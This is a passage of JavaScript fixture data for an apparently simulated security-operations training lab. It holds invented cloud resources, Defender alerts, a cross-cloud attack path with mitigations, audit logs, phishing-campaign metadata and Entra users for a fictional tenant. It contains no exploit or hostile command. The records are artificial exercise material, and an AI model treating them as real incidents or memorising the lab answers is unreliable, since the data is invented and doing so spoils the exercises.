    resourceId: 'projects/proj-aaaa1111/zones/us-central1-b/instances/hacksmarterlabs-prod-batch-uc1-b7',
    region: 'us-central1',
    riskLevel: 'None',
    exposure: 'Private, no external IP',
    alerts: 0,
    recs: 0
  },
  {
    id: 'res-e-bbbb2222-6',
    cloud: 'GCP',
    type: 'Cloud SQL instance',
    name: 'hacksmarterlabs-prod-users-sql',
    resourceId: 'projects/proj-aaaa1111/instances/hacksmarterlabs-prod-users-sql',
    region: 'europe-west3',
    riskLevel: 'High',
    exposure: 'Public IP with authorized network 0.0.0.0/0',
    alerts: 0,
    recs: 4
  },
  {
    id: 'res-f-bbbb2222-8',
    cloud: 'GCP',
    type: 'Compute instance',
    name: 'hacksmarterlabs-prod-api-uc1-a2',
    resourceId: 'projects/proj-aaaa1111/zones/us-central1-a/instances/hacksmarterlabs-prod-api-uc1-a2',
    region: 'us-central1',
    riskLevel: 'Low',
    exposure: 'Private, SSH through Identity-Aware Proxy only',
    alerts: 0,
    recs: 2
  },
  {
    id: 'res-g-bbbb2222-0',
    cloud: 'GCP',
    type: 'Storage bucket',
    name: 'hacksmarterlabs-prod-datalake-uc1',
    resourceId: 'projects/_/buckets/hacksmarterlabs-prod-datalake-uc1',
    region: 'us-central1',
    riskLevel: 'None',
    exposure: 'Uniform bucket-level access, no public members',
    alerts: 0,
    recs: 1
  },
  {
    id: 'res-h-bbbb2222-1',
    cloud: 'AWS',
    type: 'EC2 instance',
    name: 'i-0d27a9e4c15b83f60',
    displayName: 'prd-api-use1-01',
    resourceId: 'arn:aws:ec2:us-east-1:111122223333:instance/i-0d27a9e4c15b83f60',
    region: 'us-east-1',
    riskLevel: 'Low',
    exposure: 'Private subnet, load balancer origin only',
    alerts: 0,
    recs: 2
  },
  {
    id: 'res-i-bbbb2222-5',
    cloud: 'AWS',
    type: 'EC2 instance',
    name: 'i-05f6b0c3d8a71e492',
    displayName: 'prd-bastion-euw1',
    resourceId: 'arn:aws:ec2:eu-west-1:111122223333:instance/i-05f6b0c3d8a71e492',
    region: 'eu-west-1',
    riskLevel: 'Low',
    exposure: 'Management ports restricted to the bastion security group',
    alerts: 0,
    recs: 3
  },
  {
    id: 'res-j-bbbb2222-2',
    cloud: 'GCP',
    type: 'Container cluster',
    name: 'gke-hacksmarterlabs-prod-euw3',
    resourceId: 'projects/proj-aaaa1111/locations/europe-west3/clusters/gke-hacksmarterlabs-prod-euw3',
    region: 'europe-west3',
    riskLevel: 'Medium',
    exposure: 'Workload identity bound to cluster-admin',
    alerts: 1,
    recs: 3
  },
  {
    id: 'res-k-bbbb2222-10',
    cloud: 'AWS',
    type: 'S3 bucket',
    name: 'hacksmarterlabs-prod-artifacts-euw1',
    resourceId: 'arn:aws:s3:::hacksmarterlabs-prod-artifacts-euw1',
    region: 'eu-west-1',
    riskLevel: 'Low',
    exposure: 'Bucket policy grants cross-account read',
    alerts: 0,
    recs: 2
  },
  {
    id: 'res-l-bbbb2222-9',
    cloud: 'AWS',
    type: 'S3 bucket',
    name: 'hacksmarterlabs-prod-backups-use1',
    resourceId: 'arn:aws:s3:::hacksmarterlabs-prod-backups-use1',
    region: 'us-east-1',
    riskLevel: 'Low',
    exposure: 'Block public access enabled, versioning on',
    alerts: 0,
    recs: 1
  }
];

const MC_ALERTS = [
  {
    id: 'alert-a-bbbb2222-5',
    cloud: 'GCP',
    title: 'Unusual access event on container cluster',
    severity: 'High',
    resource: 'gke-hacksmarterlabs-prod-euw3',
    type: 'Kubernetes workload',
    status: 'Active',
    time: '2026-06-28T12:42:00Z',
    endTime: '2026-06-28T12:44:00Z',
    tactics: ['Execution', 'Privilege Escalation'],
    description: 'An unexpected role was assumed by an identity in the container cluster, indicating potential misuse or unauthorized access.',
    plan: 'Defender for Containers (GCP connector)',
    scope: 'proj-aaaa1111',
    incidentId: 'dfc-inc-03',
    entities: [
      { type: 'Container cluster', value: 'gke-hacksmarterlabs-prod-euw3' },
      { type: 'Account',           value: 'ops-shared-admin' },
      { type: 'Role',              value: 'cluster-admin' },
    ],
    evidence: { 'Region': 'europe-west3', 'Namespace': 'payments', 'Connector': 'GCP project proj-aaaa1111', 'Role assumed': 'cluster-admin', 'Prior use of this role by identity': 'None' },
    mitigation: [
      'Remove the elevated role binding and confirm the workload identity only holds what it needs.',
      'Check whether the same operator account is used in the connected AWS account.',
    ],
    recommendations: [
      'GCP container clusters should not grant cluster-admin to workload identities',
      'Operator accounts should not be shared across cloud providers',
    ]
  },
  {
    id: 'alert-b-bbbb2222-3',
    cloud: 'AWS',
    title: 'Unsuccessful login attempts on keypair management service',
    severity: 'Medium',
    resource: 'i-0b8d41f7c9a2e6f35',
    type: 'EC2 instance',
    status: 'Active',
    time: '2026-06-28T11:55:00Z',
    endTime: '2026-06-28T12:10:00Z',
    tactics: ['Credential Access'],
    description: 'A series of failed sign-on attempts were detected, which could indicate a compromised key pair or brute-force attack.',
    plan: 'Defender for Servers (AWS connector)',
    scope: '111122223333',
    incidentId: 'dfc-inc-03',
    entities: [
      { type: 'EC2 instance', value: 'i-0b8d41f7c9a2e6f35' },
      { type: 'Name tag',     value: 'prd-web-euw1-03' },
      { type: 'Account',      value: 'ops-shared-admin' },
      { type: 'IP address',  value: '198.51.100.72' },
    ],
    evidence: { 'Region': 'eu-west-1', 'VPC': 'vpc-0a19c4d7e2b6f8351', 'Connector': 'AWS account 111122223333', 'Failed attempts': '61 in 15 minutes', 'Successful sign-in': 'None observed' },
    mitigation: [
      'Rotate the key pair used by the instance and confirm no new public key was added.',
      'Restrict management-port exposure on the instance to the approved jump path.',
    ],
    recommendations: [
      'AWS instances should not expose management ports to the internet',
      'Key pairs should be rotated on a defined schedule',
    ]
  }
];

const MC_ATTACK_PATHS = [
  {
    id: 'mc-path-1',
    cloud: 'AWS + GCP',
    severity: 'high',
    status: 'Pending',
    assetType: 'Cross-cloud identity',
    firstSeen: '2026-06-28T12:04:00Z',
    lastSeen: '2026-06-28T12:33:00Z',
    affectedResources: 5,
    name: 'Shared admin path from AWS VM to GCP cluster',
    start: 'i-0b8d41f7c9a2e6f35',
    entryPoint: 'Public AWS management port',
    target: 'gke-prod-01',
    chokePoints: ['ops-shared-admin'],
    path: [
      'AWS connector sees a VM with broad CSPM and server coverage',
      'A reused operator account touches both the AWS host and the GCP project',
      'The GCP container cluster has an elevated workload identity and exposed control plane',
    ],
    result: 'Cross-cloud lateral movement could reach the container cluster and pivot into the database and storage tier.',
    scenario: 'A reused operator identity connects an exposed AWS workload to a privileged GCP container environment.',
    nodes: [
      { id:'aws-vm', role:'entry', type:'AWS EC2 instance', label:'prd-web-euw1-03', subtitle:'Public management port · eu-west-1', insight:'The instance exposes a management service and has recent failed credential activity.', riskFactors:['Internet exposed','Management port open'], techniques:['T1133 External Remote Services'], recommendationIds:['ap-rec-aws-port'] },
      { id:'shared-admin', role:'choke', type:'Cloud identity', label:'ops-shared-admin', subtitle:'Used in AWS and GCP', insight:'This shared operator account is the cross-cloud choke point and carries privileges in both environments.', riskFactors:['Credential reuse','Cross-cloud privilege'], techniques:['T1078 Valid Accounts'], recommendationIds:['ap-rec-shared-admin'] },
      { id:'gke-cluster', role:'vulnerable', type:'GCP Kubernetes cluster', label:'gke-prod-01', subtitle:'Elevated workload identity', insight:'The cluster accepts the shared identity and a workload identity holds excessive permissions.', riskFactors:['Exposed control plane','Broad workload identity'], techniques:['T1613 Container and Resource Discovery'], recommendationIds:['ap-rec-gke-iam'] },
      { id:'gcp-data', role:'target', type:'GCP data tier', label:'orders-prod', subtitle:'Database and storage services', insight:'The production data tier is reachable from the elevated cluster workload.', riskFactors:['Sensitive data','Production target'], techniques:['T1530 Data from Cloud Storage'], recommendationIds:['ap-rec-gcp-network'] },
    ],
    recommendations: [
      { id:'ap-rec-aws-port', kind:'mitigating', title:'Restrict the AWS instance management port to the approved jump path', resource:'prd-web-euw1-03', status:'Not started' },
      { id:'ap-rec-shared-admin', kind:'mitigating', title:'Replace ops-shared-admin with cloud-specific identities', resource:'ops-shared-admin', status:'Not started' },
      { id:'ap-rec-gke-iam', kind:'mitigating', title:'Remove cluster-admin from the GCP workload identity', resource:'gke-prod-01', status:'Not started' },
      { id:'ap-rec-gcp-network', kind:'additional', title:'Restrict the GCP data tier to private workload paths', resource:'orders-prod', status:'Not started' },
    ],
  },
];

const DEFENDER_CLOUD_FIM = {
  enabledByDefault: true,
  scope: 'Servers and container nodes',
  monitored: [
    '/etc/ssh/sshd_config',
    '/var/log/auth.log',
    'C:\\Windows\\System32\\drivers\\etc\\hosts',
    'C:\\inetpub\\wwwroot\\web.config',
  ],
  recentChanges: [
    { item:'/etc/ssh/sshd_config', change:'Unexpected allow-list edit', source:'AWS workload' },
    { item:'C:\\Windows\\System32\\drivers\\etc\\hosts', change:'Local name resolution change', source:'GCP VM' },
    { item:'/var/log/auth.log', change:'Burst of failed logons', source:'AWS workload' },
  ],
};

const DEFENDER_CLOUD_JIT = {
  vm: 'i-0b8d41f7c9a2e6f35',
  ports: ['3389', '22'],
  duration: '3 hours',
  requestState: 'Approved',
  requestor: 'cloud-admin@hacksmarterlabs.example',
  note: 'Lab-only request surface; no real network access is opened.',
};

// --- T08: out/t08-audit-premium.js ---
const AUDIT_RETENTION_POLICIES = [
    {
        id: 'arp-1',
        name: 'Daily Usage Tracking',
        users: ['R.Vance@northwindops.example','M.Okafor@northwindops.example'],
        recordTypes: ['ExchangeItem','SharePointFileOperation','CopilotInteraction'],
        duration: '30 days',
        priority: 1
    },
    {
        id: 'arp-2',
        name: 'Quarterly Data Review',
        users: ['M.Okafor@northwindops.example'],
        recordTypes: ['SharePointFileOperation','CopilotInteraction'],
        duration: '90 days',
        priority: 3
    },
    {
        id: 'arp-3',
        name: 'Full Year Audit',
        users: [],
        recordTypes: ['ExchangeItem','SharePointFileOperation','CopilotInteraction'],
        duration: '1 year',
        priority: 5
    },
    {
        id: 'arp-4',
        name: 'Annual Compliance Check',
        users: [],
        recordTypes: ['ExchangeItem','SharePointFileOperation','CopilotInteraction'],
        duration: '10 years',
        priority: 2
    },
    {
        id: 'arp-5',
        name: 'Special Project Audits',
        users: [],
        recordTypes: ['ExchangeItem'],
        duration: '365 days',
        priority: 4
    }
];

const AUDIT_COPILOT_EVENTS = [
    {
        time: '2026-06-01T09:15:00.000Z',
        user: 'R.Vance@northwindops.example',
        operation: 'CopilotInteraction',
        workload: 'SecurityCopilot',
        detail: 'Generated a custom DLP policy for sensitive data.'
    },
    {
        time: '2026-06-15T14:30:00.000Z',
        user: 'M.Okafor@northwindops.example',
        operation: 'CopilotInteraction',
        workload: 'Word',
        detail: 'Saved draft document on OneDrive.'
    },
    {
        time: '2026-06-30T11:45:00.000Z',
        user: 'R.Vance@northwindops.example',
        operation: 'CopilotInteraction',
        workload: 'Teams',
        detail: 'Integrated Office 365 DLP policies with compliance features.'
    },
    {
        time: '2026-07-01T08:00:00.000Z',
        user: 'M.Okafor@northwindops.example',
        operation: 'CopilotInteraction',
        workload: 'Outlook',
        detail: 'Created a calendar event reminder for next month.'
    },
    {
        time: '2026-07-05T13:25:00.000Z',
        user: 'R.Vance@northwindops.example',
        operation: 'CopilotInteraction',
        workload: 'SecurityCopilot',
        detail: 'Set up audit trails for all Office 365 tenants.'
    },
    {
        time: '2026-07-06T10:45:00.000Z',
        user: 'M.Okafor@northwindops.example',
        operation: 'CopilotInteraction',
        workload: 'Word',
        detail: 'Saved final draft for board presentation on OneDrive.'
    },
    {
        time: '2026-06-10T15:30:00.000Z',
        user: 'R.Vance@northwindops.example',
        operation: 'CopilotInteraction',
        workload: 'Teams',
        detail: 'Integrated DLP policies into compliance dashboards.'
    },
    {
        time: '2026-06-25T11:00:00.000Z',
        user: 'M.Okafor@northwindops.example',
        operation: 'CopilotInteraction',
        workload: 'Teams',
        detail: 'Prepared presentation slides for next meeting.'
    },
    {
        time: '2026-07-03T14:50:00.000Z',
        user: 'R.Vance@northwindops.example',
        operation: 'CopilotInteraction',
        workload: 'Outlook',
        detail: 'Set up reminders for upcoming board meetings.'
    },
    {
        time: '2026-07-04T09:35:00.000Z',
        user: 'M.Okafor@northwindops.example',
        operation: 'CopilotInteraction',
        workload: 'SecurityCopilot',
        detail: 'Reviewed DLP policy settings for new users.'
    }
];

const AUDIT_LOG = [
  { time:'2026-06-28T15:00:11Z', user:'jdoe@hacksmarterlabs.example', op:'FileDownloaded',
    workload:'OneDrive', item:'/personal/jdoe/customer-list.xlsx', ip:'76.21.55.4' },
  { time:'2026-06-28T14:55:02Z', user:'admin@hacksmarterlabs.example', op:'Add member to role',
    workload:'AzureAD', item:'Role: Global Administrator', ip:'10.10.0.5' },
  { time:'2026-06-28T14:20:33Z', user:'svc-backup@hacksmarterlabs.example', op:'DirectoryServicesReplication',
    workload:'AAD Connect', item:'DC01.hacksmarterlabs.example', ip:'10.20.4.55' },
  { time:'2026-06-28T08:23:11Z', user:'jane.doe@hacksmarterlabs.example', op:'Consent to application',
    workload:'AzureAD', item:'DocViewer Pro', ip:'76.21.55.4' },
  { time:'2026-06-28T13:27:00Z', user:'sam.lee@hacksmarterlabs.example', op:'UserLoggedIn',
    workload:'AzureAD', item:'Risky sign-in', ip:'91.219.236.54' },
  { time:'2026-06-28T10:19:45Z', user:'fin-svc@hacksmarterlabs.example', op:'FileModified',
    workload:'SharePoint', item:'/sites/finance/budget.locked', ip:'10.30.8.22' },
  { time:'2026-07-04T09:35:00Z', user:'m.okafor@hacksmarterlabs.example', op:'CopilotInteraction',
    workload:'SecurityCopilot', item:'Reviewed DLP policy settings for new users.', ip:'10.10.0.8' },
  { time:'2026-07-05T13:25:00Z', user:'r.vance@hacksmarterlabs.example', op:'CopilotInteraction',
    workload:'SecurityCopilot', item:'Set up audit trails for all Office 365 tenants.', ip:'10.10.0.8' },
  { time:'2026-07-06T10:45:00Z', user:'m.okafor@hacksmarterlabs.example', op:'CopilotInteraction',
    workload:'Word', item:'Saved final draft for board presentation on OneDrive.', ip:'10.10.0.9' },
  { time:'2026-06-30T11:45:00Z', user:'r.vance@hacksmarterlabs.example', op:'CopilotInteraction',
    workload:'Teams', item:'Integrated Office 365 DLP policies with compliance features.', ip:'10.10.0.8' },
  { time:'2026-07-01T08:00:00Z', user:'m.okafor@hacksmarterlabs.example', op:'CopilotInteraction',
    workload:'Outlook', item:'Created a calendar event reminder for next month.', ip:'10.10.0.9' },
];

// --- T09: out/t09-threat-explorer.js ---
const TX_EMAILS = [
    {
        id: 'tx-01',
        time: '2026-06-15T14:30:00Z',
        subject: 'Payment reminder - invoice 8912 overdue - action required',
        sender: 'northwind-payments.example.com',
        recipient: 'support@northwindops.example',
        verdict: 'Phish',
        threat: 'Credential phishing',
        deliveryAction: 'Blocked',
        campaign: 'Invoice lure June'
    },
    {
        id: 'tx-02',
        time: '2026-06-15T14:35:00Z',
        subject: 'URGENT: Invoice 9017 overdue - payment required by end of day',
        sender: 'northwind-payments.example.com',
        recipient: 'account@northwindops.example',
        verdict: 'Phish',
        threat: 'Credential phishing',
        deliveryAction: 'Blocked',
        campaign: 'Invoice lure June'
    },
    {
        id: 'tx-03',
        time: '2026-06-15T14:40:00Z',
        subject: 'Annual report 2025 - review the figures NOW',
        sender: 'northwind-payrolls.example.com',
        recipient: 'hr@northwindops.example',
        verdict: 'Spam',
        threat: 'None',
        deliveryAction: 'Junked',
        campaign: 'Payroll update lure'
    },
    {
        id: 'tx-04',
        time: '2026-06-15T14:45:00Z',
        subject: 'Invoice 9123 overdue - payment essential today',
        sender: 'northwind-payments.example.com',
        recipient: 'finance@northwindops.example',
        verdict: 'Phish',
        threat: 'Credential phishing',
        deliveryAction: 'Blocked',
        campaign: 'Invoice lure June'
    },
    {
        id: 'tx-05',
        time: '2026-06-15T14:50:00Z',
        subject: 'Annual report 2025 - view online NOW for accuracy',
        sender: 'northwind-payrolls.example.com',
        recipient: 'hr@northwindops.example',
        verdict: 'Spam',
        threat: 'None',
        deliveryAction: 'Junked',
        campaign: 'Payroll update lure'
    },
    {
        id: 'tx-06',
        time: '2026-06-16T14:30:00Z',
        subject: 'Upcoming payroll adjustments - update your details now',
        sender: 'northwind-payrolls.example.com',
        recipient: 'hr@northwindops.example',
        verdict: 'Phish',
        threat: 'Financial fraud',
        deliveryAction: 'Blocked',
        campaign: 'Payroll update lure'
    },
    {
        id: 'tx-07',
        time: '2026-06-17T14:35:00Z',
        subject: 'Invoice 9184 overdue - payment required by end of day',
        sender: 'northwind-payments.example.com',
        recipient: 'account@northwindops.example',
        verdict: 'Phish',
        threat: 'Credential phishing',
        deliveryAction: 'Blocked',
        campaign: 'Invoice lure June'
    },
    {
        id: 'tx-08',
        time: '2026-06-17T14:40:00Z',
        subject: 'URGENT: Payment required - today only for invoice 9234',
        sender: 'northwind-payments.example.com',
        recipient: 'account@northwindops.example',
        verdict: 'Phish',
        threat: 'Credential phishing',
        deliveryAction: 'Blocked',
        campaign: 'Invoice lure June'
    },
    {
        id: 'tx-09',
        time: '2026-06-18T14:35:00Z',
        subject: 'URGENT: Payment due - invoice 9378 overdue by tomorrow',
        sender: 'northwind-payments.example.com',
        recipient: 'account@northwindops.example',
        verdict: 'Phish',
        threat: 'Credential phishing',
        deliveryAction: 'Blocked',
        campaign: 'Invoice lure June'
    },
    {
        id: 'tx-10',
        time: '2026-06-18T15:45:00Z',
        subject: 'Annual report 2025 - review now to avoid confusion',
        sender: 'northwind-payrolls.example.com',
        recipient: 'hr@northwindops.example',
        verdict: 'Clean',
        threat: 'None',
        deliveryAction: 'Delivered',
        campaign: 'Payroll update lure'
    },
    {
        id: 'tx-11',
        time: '2026-06-19T15:35:00Z',
        subject: 'Weekly payroll summary - check your earnings',
        sender: 'northwind-payrolls.example.com',
        recipient: 'hr@northwindops.example',
        verdict: 'Clean',
        threat: 'None',
        deliveryAction: 'Delivered',
        campaign: 'Payroll update lure'
    },
    {
        id: 'tx-12',
        time: '2026-06-19T15:40:00Z',
        subject: 'URGENT: Payment required - invoice 9765 overdue by EOD tomorrow',
        sender: 'northwind-payments.example.com',
        recipient: 'account@northwindops.example',
        verdict: 'Phish',
        threat: 'Credential phishing',
        deliveryAction: 'Blocked',
        campaign: 'Invoice lure June'
    },
    {
        id: 'tx-13',
        time: '2026-06-20T15:35:00Z',
        subject: 'Weekly payroll summary - check your earnings and benefits',
        sender: 'northwind-payrolls.example.com',
        recipient: 'hr@northwindops.example',
        verdict: 'Clean',
        threat: 'None',
        deliveryAction: 'Delivered',
        campaign: 'Payroll update lure'
    },
    {
        id: 'tx-14',
        time: '2026-06-22T15:35:00Z',
        subject: 'URGENT: Tax returns - file now online for credit on your 9765 invoice',
        sender: 'northwind-payments.example.com',
        recipient: 'account@northwindops.example',
        verdict: 'Phish',
        threat: 'Financial fraud',
        deliveryAction: 'Blocked',
        campaign: 'Invoice lure June'
    },
    {
        id: 'tx-15',
        time: '2026-06-23T15:40:00Z',
        subject: 'URGENT: Tax returns - file now online for credit on invoice 9765',
        sender: 'northwind-payments.example.com',
        recipient: 'account@northwindops.example',
        verdict: 'Phish',
        threat: 'Financial fraud',
        deliveryAction: 'Blocked',
        campaign: 'Invoice lure June'
    },
    {
        id: 'tx-16',
        time: '2026-07-01T09:20:00Z',
        subject: 'Quarterly_report_2026.docm',
        sender: 'external-mailer.example',
        recipient: 'finance@northwindops.example',
        verdict: 'Malware',
        threat: 'Malicious attachment',
        deliveryAction: 'Quarantined',
        campaign: 'Attachment detonation July'
    },
    {
        id: 'tx-17',
        time: '2026-07-01T09:28:00Z',
        subject: 'Shared invoice image.zip',
        sender: 'external-mailer.example',
        recipient: 'support@northwindops.example',
        verdict: 'Malware',
        threat: 'Macro loader',
        deliveryAction: 'Removed by ZAP',
        campaign: 'Attachment detonation July'
    }
];

const THREAT_EXPLORER_CAMPAIGNS = [
  {
    id: 'camp-invoice',
    name: 'Invoice lure June',
    verdict: 'Phish',
    messageCount: 7,
    topTargets: ['account@northwindops.example', 'finance@northwindops.example', 'support@northwindops.example'],
    summary: 'Reused invoice language, urgent payment requests, and credential-harvesting links aimed at finance staff.',
    deliveryActions: 'Blocked or junked before user mailbox delivery.',
    zapNote: 'Delivered phish would be removed by ZAP if it reached the inbox.',
  },
  {
    id: 'camp-payroll',
    name: 'Payroll update lure',
    verdict: 'Phish',
    messageCount: 5,
    topTargets: ['hr@northwindops.example'],
    summary: 'Payroll-themed subject lines were used to attract HR and accounting users into reply or click behavior.',
    deliveryActions: 'Messages were mostly junked as low-confidence phishing.',
    zapNote: 'The lab treats the wave as a credential phishing campaign with no confirmed malware.',
  },
  {
    id: 'camp-attachment',
    name: 'Attachment detonation July',
    verdict: 'Malware',
    messageCount: 2,
    topTargets: ['finance@northwindops.example', 'support@northwindops.example'],
    summary: 'Attachment-heavy wave delivering macro and archive payloads that were caught by mail protections.',
    deliveryActions: 'One message quarantined, one removed by ZAP.',
    zapNote: 'Campaign pivots on attachment verdict, sender domain reuse, and recipient group overlap.',
  },
];

// --- T12: out/t12-knowledge.js ---
const COPILOT_KNOWLEDGE = [
  { id:'kb-1', name:'IR runbooks', type:'File upload', items:22, status:'Ready', scope:'SOC all', addedBy:'R. Vance' },
  { id:'kb-2', name:'Identity policy library', type:'File upload', items:14, status:'Ready', scope:'IRM analysts', addedBy:'M. Okafor' },
  { id:'kb-3', name:'Asset register extract', type:'Azure AI Search index', items:1830, status:'Ready', scope:'SOC all', addedBy:'R. Vance' },
  { id:'kb-4', name:'Network diagrams', type:'File upload', items:9, status:'Indexing', scope:'Tier 2 only', addedBy:'L. Harper' },
  { id:'kb-5', name:'Vendor risk notes', type:'Azure AI Search index', items:412, status:'Ready', scope:'GRC team', addedBy:'M. Okafor' },
];

function readStoredJson(key, fallback) {
  if (typeof localStorage === 'undefined') return fallback;
  try {
    const raw = localStorage.getItem(key);
    return raw ? JSON.parse(raw) : fallback;
  } catch {
    return fallback;
  }
}

function getCopilotCustomSessions() {
  return readStoredJson('defender-lab.copilot.sessions.custom', []);
}

function getCopilotSessions() {
  return [...COPILOT_SESSIONS, ...getCopilotCustomSessions()];
}

function getCopilotTranscriptRecords() {
  return [...COPILOT_TRANSCRIPTS, ...readStoredJson('defender-lab.copilot.transcripts.custom', [])];
}

function getCopilotTranscript(sessionId) {
  return getCopilotTranscriptRecords().find(record => record.sessionId === sessionId)?.steps || [];
}

function getCopilotSession(sessionId) {
  return getCopilotSessions().find(session => session.id === sessionId);
}

function getCopilotPromptbooks() {
  return [...COPILOT_PROMPTBOOKS, ...readStoredJson('defender-lab.copilot.promptbooks.custom', [])];
}

function getCopilotPlugins() {
  const enabled = readStoredJson('defender-lab.copilot.plugins.enabled', {});
  return COPILOT_PLUGINS.map(plugin => ({
    ...plugin,
    status: enabled[plugin.id] === undefined ? plugin.status : (enabled[plugin.id] ? 'On' : 'Off'),
  }));
}

function getCopilotKnowledge() {
  return [...COPILOT_KNOWLEDGE, ...readStoredJson('defender-lab.copilot.knowledge.custom', [])];
}

function getCopilotSettings() {
  return { ...COPILOT_SETTINGS_DEFAULTS, ...readStoredJson('defender-lab.copilot.settings', {}) };
}
// === end local-tasks fixtures ===

// ===================== Entra admin center — tenant directory =====================
// Populates #/entra/overview so the Entra surface carries the same synthetic
// tenant the Defender/Sentinel views investigate. Every principal here either
// appears in IDENTITIES (Defender for Identity onboarded) or in the alert /
// incident fixtures, so cross-portal pivots line up.
const ENTRA_TENANT = {
  name:'Hack Smarter Labs',
  domain:'hacksmarterlabs.example',
  tenantId:'8f4a2c19-6b30-4d77-9a51-c2e8b4d70f13',
  license:'Entra ID P2',
  seatsUsed:24,
  seatsTotal:50,
  region:'North America',
  syncStatus:'Healthy',
  syncServer:'AAD-CONNECT-01.hacksmarterlabs.example',
  lastSync:'2026-06-28T15:00:00Z',
  secureScore:68,
  secureScoreMax:100,
};

// Directory users. `xdrIdentity` links to an IDENTITIES row when the principal
// is onboarded to Defender for Identity (drives the row click-through).
const ENTRA_USERS = [
  { upn:'jane.doe@hacksmarterlabs.example', displayName:'Jane Doe', jobTitle:'Senior Analyst', department:'Finance',
    userType:'Member', enabled:true, source:'Windows Server AD (synced)', created:'2024-01-15T08:00:00Z',
    lastSignIn:'2026-06-28T08:30:00Z', mfa:'Authenticator', sspr:true,
    riskState:'At risk', riskLevel:'High', riskDetail:'Consent grant to DocViewer Pro after AiTM phish',
    roles:[], licenses:['365 E5'], devices:3, groups:6,
    xdrIdentity:'jane.doe@hacksmarterlabs.example', incidentId:'INC-1042' },
  { upn:'maria.ross@hacksmarterlabs.example', displayName:'Maria Ross', jobTitle:'Account Executive', department:'Sales',
    userType:'Member', enabled:true, source:'Windows Server AD (synced)', created:'2024-02-20T00:00:00Z',
    lastSignIn:'2026-06-28T06:44:00Z', mfa:'SMS', sspr:true,
    riskState:'Confirmed compromised', riskLevel:'High', riskDetail:'AiTM token replay from a second ASN',
    roles:[], licenses:['365 E5'], devices:2, groups:4,
    xdrIdentity:'maria.ross@hacksmarterlabs.example', incidentId:'INC-1051' },
  { upn:'sam.lee@hacksmarterlabs.example', displayName:'Sam Lee', jobTitle:'Software Engineer', department:'Engineering',
    userType:'Member', enabled:true, source:'Cloud only', created:'2024-04-10T00:00:00Z',
    lastSignIn:'2026-06-28T13:33:00Z', mfa:'Authenticator', sspr:true,
    riskState:'At risk', riskLevel:'High', riskDetail:'Unfamiliar properties + anonymous IP + impossible travel',
    roles:[], licenses:['365 E5'], devices:2, groups:5,
    xdrIdentity:'sam.lee@hacksmarterlabs.example', incidentId:'INC-1053' },
  { upn:'liam.chen@hacksmarterlabs.example', displayName:'Liam Chen', jobTitle:'Field Technician', department:'IT Operations',
    userType:'Member', enabled:true, source:'Windows Server AD (synced)', created:'2024-06-03T00:00:00Z',
    lastSignIn:'2026-06-28T04:12:00Z', mfa:'Not registered', sspr:false,
    riskState:'At risk', riskLevel:'Medium', riskDetail:'Password spray — 8 failed attempts from 203.0.113.74',
    roles:[], licenses:['365 E3'], devices:1, groups:3,
    xdrIdentity:null, incidentId:'INC-1053' },
  { upn:'nina.patel@hacksmarterlabs.example', displayName:'Nina Patel', jobTitle:'Billing Specialist', department:'Finance',
    userType:'Member', enabled:true, source:'Windows Server AD (synced)', created:'2024-03-11T00:00:00Z',
    lastSignIn:'2026-06-28T07:55:00Z', mfa:'Authenticator', sspr:true,
    riskState:'At risk', riskLevel:'Medium', riskDetail:'Suspicious inbox rule forwarding invoices externally',
    roles:[], licenses:['365 E5'], devices:1, groups:4,
    xdrIdentity:null, incidentId:'INC-1042' },
  { upn:'evan.brooks@hacksmarterlabs.example', displayName:'Evan Brooks', jobTitle:'HR Generalist', department:'Human Resources',
    userType:'Member', enabled:true, source:'Cloud only', created:'2025-01-22T00:00:00Z',
    lastSignIn:'2026-06-27T16:20:00Z', mfa:'Authenticator', sspr:true,
    riskState:'Remediated', riskLevel:'Low', riskDetail:'Clicked payroll-calendar phish; password reset completed',
    roles:[], licenses:['365 E3'], devices:1, groups:3,
    xdrIdentity:null, incidentId:null },
  { upn:'olivia.kim@hacksmarterlabs.example', displayName:'Olivia Kim', jobTitle:'Security Operations Lead', department:'Security Operations',
    userType:'Member', enabled:true, source:'Cloud only', created:'2023-10-05T00:00:00Z',
    lastSignIn:'2026-06-28T14:40:00Z', mfa:'Passkey (FIDO2)', sspr:true,
    riskState:'None', riskLevel:'None', riskDetail:'PIM activation of Security Administrator (CHG-4821, approved)',
    roles:['Security Administrator (PIM eligible)'], licenses:['365 E5'], devices:2, groups:8,
    xdrIdentity:null, incidentId:null },
  { upn:'jordan.wong@hacksmarterlabs.example', displayName:'Jordan Wong', jobTitle:'Travel Coordinator', department:'Operations',
    userType:'Member', enabled:true, source:'Cloud only', created:'2025-03-14T00:00:00Z',
    lastSignIn:'2026-06-28T09:05:00Z', mfa:'SMS', sspr:true,
    riskState:'At risk', riskLevel:'Low', riskDetail:'Consented to the Hack Smarter Travel enterprise app (verified publisher)',
    roles:[], licenses:['365 E3'], devices:1, groups:2,
    xdrIdentity:null, incidentId:null },
  { upn:'jdoe@hacksmarterlabs.example', displayName:'jdoe (local)', jobTitle:'Workstation user (WKS-03)', department:'Sales',
    userType:'Member', enabled:true, source:'Windows Server AD (synced)', created:'2025-11-08T12:14:00Z',
    lastSignIn:'2026-06-28T15:00:00Z', mfa:'Not registered', sspr:false,
    riskState:'At risk', riskLevel:'Medium', riskDetail:'Failed-then-success local interactive logons on WKS-03',
    roles:[], licenses:['365 E3'], devices:1, groups:2,
    xdrIdentity:'jdoe@hacksmarterlabs.example', incidentId:'INC-1038' },
  { upn:'dpatel@hacksmarterlabs.example', displayName:'Dev Patel', jobTitle:'Platform Engineer', department:'Engineering',
    userType:'Member', enabled:true, source:'Windows Server AD (synced)', created:'2024-05-19T00:00:00Z',
    lastSignIn:'2026-06-28T11:02:00Z', mfa:'Passkey (FIDO2)', sspr:true,
    riskState:'None', riskLevel:'None', riskDetail:'',
    roles:[], licenses:['365 E5'], devices:2, groups:5,
    xdrIdentity:null, incidentId:null },
  { upn:'mfoster@hacksmarterlabs.example', displayName:'Morgan Foster', jobTitle:'Manufacturing Supervisor', department:'Operations',
    userType:'Member', enabled:true, source:'Windows Server AD (synced)', created:'2023-11-30T00:00:00Z',
    lastSignIn:'2026-06-28T05:48:00Z', mfa:'Not registered', sspr:false,
    riskState:'None', riskLevel:'None', riskDetail:'Legacy Win10 endpoints; MFA registration outstanding',
    roles:[], licenses:['365 E3'], devices:2, groups:3,
    xdrIdentity:null, incidentId:null },
  { upn:'olivia.martin@hacksmarterlabs.example', displayName:'Olivia Martin', jobTitle:'Regional Sales Manager', department:'Sales',
    userType:'Member', enabled:true, source:'Cloud only', created:'2024-08-02T00:00:00Z',
